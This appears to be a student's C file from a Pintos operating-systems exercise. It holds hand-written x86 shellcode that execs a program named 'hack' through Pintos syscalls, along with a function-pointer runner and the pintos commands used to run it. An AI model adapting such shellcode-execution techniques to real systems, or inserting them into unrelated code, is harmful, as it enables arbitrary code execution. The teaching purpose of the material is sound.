#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <stdio.h>
#include <string.h>



char shellcode[] = {
	"\x6A\x00" 			   //push 0x00
	"\x68\x68\x61\x63\x6B" //push 0x6b636168
	"\x89\xE2" 			   //mov edx, esp
	"\x52"				   //push edx
	"\x6A\x02"			   //push 0x2
	"\xCD\x30"             //int 0x30

	"\x6A\x01"			   //push 0x1
	"\xCD\x30"			   //int 0x30
}; 


//Command to run exploit in  ../userprog/build
//pintos -q rm shellcodeRoh rm hack;cd ../../examples/;make;cd ../userprog/build;pintos -v -p ../../examples/hack -a hack -p ../../examples/shellcodeRoh -a shellcodeRoh -- -f -q;pintos -q run 'shellcodeRoh'

//FINAL WORKING!
// push   0x0  - //Pushing null terminator. 
// push   push 0x6b636168 -  //Pushing hack in hex
// mov    edx,esp - //Copying esp value into edx
// push   edx - //Push register contents (hex value) onto stack
// push   0x2 - //Push syscall number
// int    0x30  - //Interupt executing sys_exec

// push   0x01 - Pushing exit
// int    0x30 - Interupt executing sys_exit

int main()
{
  	printf("Shellcode Main START\n");
	//Executes any piece of shellcode provided
  	int (*ret)() = (int(*)())shellcode;
	ret();

	//Doesn't reach here
  	printf("Shellcode Main END\n");
	return 0;
}
